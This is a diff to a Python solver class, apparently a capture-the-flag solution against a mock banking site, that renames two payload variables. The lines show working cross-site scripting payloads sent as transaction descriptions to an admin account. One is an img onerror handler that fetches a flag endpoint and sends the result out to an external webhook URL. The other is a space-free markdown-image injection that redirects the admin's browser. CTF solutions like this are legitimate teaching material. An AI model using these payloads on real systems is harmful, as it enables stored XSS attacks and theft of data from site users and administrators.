@@ -20,21 +20,21 @@ class Solver:
         ADMIN_ACCOUNT_NUMBER = "00000000"
 
         # Exploit for loop mutation bug
-        PAYLOAD = f'''<img src="x" x-data onerror="fetch(`{API_BASE_URL}/flag`).then(response => response.text()).then(responseText => fetch(`{self.webhooksite.url}?q=${{responseText}}`))">'''
+        DESKTOP_SITE_PAYLOAD = f'''<img src="x" x-data onerror="fetch(`{API_BASE_URL}/flag`).then(response => response.text()).then(responseText => fetch(`{self.webhooksite.url}?q=${{responseText}}`))">'''
         response = self.session.post(f"{API_BASE_URL}/transactions", json={
             "from_account": { "bsb": my_bsb, "account_number": my_account_number },
             "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
-            "description": PAYLOAD,
+            "description": DESKTOP_SITE_PAYLOAD,
             "amount": 0.01
         })
         transaction_id = response.json()["id"]
 
         # No spaces allowed
-        PAYLOAD = f'''![x]("onerror="document.location='{BASE_URL}/?transaction={transaction_id}&desktop')'''
+        MOBILE_SITE_PAYLOAD = f'''![x]("onerror="document.location='{BASE_URL}/?transaction={transaction_id}&desktop')'''
         response = self.session.post(f"{API_BASE_URL}/transactions", json={
             "from_account": { "bsb": my_bsb, "account_number": my_account_number },
             "to_account": { "bsb": ADMIN_BSB, "account_number": ADMIN_ACCOUNT_NUMBER },
-            "description": PAYLOAD,
+            "description": MOBILE_SITE_PAYLOAD,
             "amount": 0.01
         })
 
